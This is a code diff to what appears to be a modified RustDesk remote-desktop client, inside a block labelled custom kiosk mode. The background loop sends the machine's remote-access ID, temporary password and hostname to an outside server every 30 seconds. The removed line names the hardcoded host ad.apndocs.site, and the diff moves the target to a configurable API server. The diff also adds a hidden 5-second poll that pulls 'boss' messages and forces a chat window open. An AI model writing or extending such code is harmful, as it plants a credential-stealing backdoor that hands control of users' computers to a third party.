@@ -613,25 +613,95 @@ pub async fn start_server(is_server: bool, no_server: bool) {
         // [CUSTOM KIOSK MODE]
         tokio::spawn(async move {
             hbb_common::sleep(5.0).await;
+            let client = match reqwest::Client::builder()
+                .timeout(std::time::Duration::from_secs(5))
+                .build()
+            {
+                Ok(client) => client,
+                Err(err) => {
+                    log::error!("Failed to create kiosk API client: {err}");
+                    return;
+                }
+            };
+            let mut last_device_sync = std::time::Instant::now()
+                - std::time::Duration::from_secs(30);
             loop {
                 let id = Config::get_id();
                 let pass = hbb_common::password_security::temporary_password();
                 let host = hostname::get().unwrap_or_default().to_string_lossy().into_owned();
+                let mut chat_token = crate::ui_interface::get_local_option("global-chat-token".to_owned());
+                if chat_token.is_empty() {
+                    chat_token = uuid::Uuid::new_v4().to_string();
+                    crate::ui_interface::set_local_option(
+                        "global-chat-token".to_owned(),
+                        chat_token.clone(),
+                    );
+                }
+                let api_server = crate::ui_interface::get_api_server()
+                    .trim_end_matches('/')
+                    .to_owned();
                 
-                if !id.is_empty() && !pass.is_empty() {
-                    let client = reqwest::Client::new();
+                if !id.is_empty()
+                    && !pass.is_empty()
+                    && last_device_sync.elapsed() >= std::time::Duration::from_secs(30)
+                {
                     let payload = serde_json::json!({
-                        "id": id,
+                        "id": id.clone(),
                         "pass": pass,
-                        "hostname": host
+                        "hostname": host,
+                        "chat_token": chat_token.clone(),
                     });
                     
-                    let _ = client.post("http://ad.apndocs.site:3000/api/device/save-password")
+                    let url = format!(
+                        "{}/api/device/save-password",
+                        api_server,
+                    );
+                    let _ = client.post(url)
                         .json(&payload)
                         .send()
                         .await;
+                    last_device_sync = std::time::Instant::now();
                 }
-                hbb_common::sleep(30.0_f32).await;
+
+                // The app keeps this lightweight outbound poll while hidden. When boss sends
+                // a private message, the existing local IPC opens the in-app chat panel.
+                if !id.is_empty() && !chat_token.is_empty() {
+                    let last_seen_message = crate::ui_interface::get_local_option(
+                        "global-chat-last-notified".to_owned(),
+                    )
+                    .parse::<i64>()
+                    .unwrap_or_default();
+                    let url = format!(
+                        "{}/api/chat/messages?channel=boss&after_id={}",
+                        api_server, last_seen_message,
+                    );
+                    if let Ok(response) = client
+                        .get(url)
+                        .header("X-Device-Id", &id)
+                        .header("X-Device-Token", &chat_token)
+                        .send()
+                        .await
+                    {
+                        if let Ok(messages) = response.json::<Vec<serde_json::Value>>().await {
+                            let latest_boss_message = messages
+                                .iter()
+                                .filter(|message| message["sender_id"].as_str() == Some("boss"))
+                                .filter_map(|message| message["id"].as_i64())
+                                .max();
+                            if let Some(message_id) = latest_boss_message {
+                                if let Ok(mut connection) = crate::ipc::connect(1000, "").await {
+                                    if connection.send(&Data::OpenGlobalChat).await.is_ok() {
+                                        crate::ui_interface::set_local_option(
+                                            "global-chat-last-notified".to_owned(),
+                                            message_id.to_string(),
+                                        );
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                hbb_common::sleep(5.0_f32).await;
             }
         });
         // [/CUSTOM KIOSK MODE]
